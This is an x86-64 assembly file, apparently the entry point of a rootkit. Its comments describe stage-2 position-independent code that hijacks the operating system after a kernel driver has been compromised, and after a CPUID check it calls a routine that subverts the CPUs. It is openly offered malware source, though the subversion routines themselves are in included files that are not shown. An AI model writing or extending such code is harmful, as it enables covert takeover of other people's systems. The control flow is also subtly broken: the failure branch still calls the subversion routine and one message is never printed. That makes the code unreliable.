# ------------------------------------------------------------------------------
# Position Independent Code. This code should, hopefully, hijack the system/os
# from any position in memory. This code blob can be streamed in by any kernel
# level code, so this code should be stage 2 after hijacking a kernel driver or
# something to that effect.
# ------------------------------------------------------------------------------

.include "src/os.s"
.include "src/cpuid.s"
.include "src/subvert.s"


.globl _init
_init:
    # Collect CPUID details.
    leaq _msg_cpuid(%rip), %rdi
    callq write
    callq cpuid_detect

    # Check CPUID details.
    leaq _msg_checker(%rip), %rdi
    callq write
    callq cpuid_check
    cmpq $0, %rax
    jz _init_fail
    leaq _msg_cpuid_valid(%rip), %rdi
    call write

    # Capture CPUs.
    leaq _msg_subvert(%rip), %rdi
    callq subvert_cpu
    callq quit


    _init_fail:
    leaq _msg_cpuid_invalid(%rip), %rdi
    callq subvert_cpu
    callq write
    callq quit


# ------------------------------------------------------------------------------
# State.
# ------------------------------------------------------------------------------

_hijacked:          .byte 0
_msg_cpuid:         .string "  Detecting CPUID\n"
_msg_checker:       .string "  Checking CPUID Results\n"
_msg_cpuid_valid:   .string "+ CPUID Capable\n"
_msg_cpuid_invalid: .string "- CPUID Incapable\n"
_msg_subvert:       .string "  Subverting CPUs.\n"
